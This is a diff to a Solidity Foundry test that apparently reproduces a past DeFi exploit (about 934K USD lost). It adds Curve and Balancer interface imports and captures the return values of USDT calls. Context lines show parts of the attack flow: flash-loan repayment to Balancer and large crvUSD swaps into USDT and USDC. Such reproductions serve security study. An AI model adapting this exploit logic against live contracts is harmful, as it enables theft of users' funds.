@@ -2,7 +2,10 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 
+import {ICurvePool} from "src/interfaces/ICurvePool.sol";
+import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
 // @KeyInfo - Total Lost : ~934K USD$
 // Attacker : https://etherscan.io/address/0xb6369f59fc24117b16742c9dfe064894d03b3b80
 // Attack Contract : https://etherscan.io/address/0x486cb3f61771ed5483691dd65f4186da9e37c68e
@@ -61,7 +64,7 @@ contract ContractTest is Test {
 
     function testExploit() external {
         USDC.approve(address(crvUSD_USDC_Pool), type(uint256).max);
-        address(USDT).call(
+        (bool success4,) = address(USDT).call(
             abi.encodeWithSignature("approve(address,uint256)", address(crvUSD_USDT_Pool), type(uint256).max)
         );
         WETH.approve(address(crvUSDController), type(uint256).max);
@@ -106,7 +109,7 @@ contract ContractTest is Test {
         crvUSD_USDT_Pool.exchange(1, 0, 9_000_000 ether, 0); // swap crvUSD to USDT
         crvUSD_USDC_Pool.exchange(1, 0, 12_000_000 ether, 0); // swap crvUSD to USDC
         USDC.transfer(address(Balancer), amounts[0] + feeAmounts[0]);
-        address(USDT).call(
+        (bool sucess5,) = address(USDT).call(
             abi.encodeWithSignature("transfer(address,uint256)", address(Balancer), amounts[2] + feeAmounts[2])
         );
 
